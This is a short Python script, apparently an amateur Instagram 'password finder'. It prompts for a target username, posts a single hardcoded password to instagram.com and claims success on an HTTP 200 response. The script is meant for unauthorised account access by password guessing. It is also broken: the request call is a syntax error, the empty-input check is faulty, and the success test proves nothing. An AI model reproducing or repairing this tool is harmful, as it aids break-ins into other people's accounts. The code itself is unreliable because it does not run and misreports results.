# i
import os
import time
import sys
import requests
import platform
from colorama import Fore

def __instagram__():
    try:
        os.system("clear")
        print(Fore.GREEN + "Hellow . Welcome Back ;)")
        time.sleep(2)
        target = input(Fore.GREEN + "\nEnter Your User Name Target ==>  ")
        if target == "" or None:
            try:
                time.sleep(2)
                print(Fore.RED + "\nOk Good Bay ;)")
                os.system("clear")
                sys.exit()
            except:
                pass
        else:
            pass
        r = requests.post("https://instagram.com/" + "username": target , "password" : "09901729946" )

        if r.status_code == 200:
            try:
                print(Fore.GREEN + "\n[+] - Your Password Is 09901729946  ;)")
                time.sleep()
                sys.exit()
            except:
                pass
        else:
            time.sleep(2)
            print(Fore.RED + "\n[-] - Your Password Is Not Found  ;(")
    except:
        pass
__instagram__()
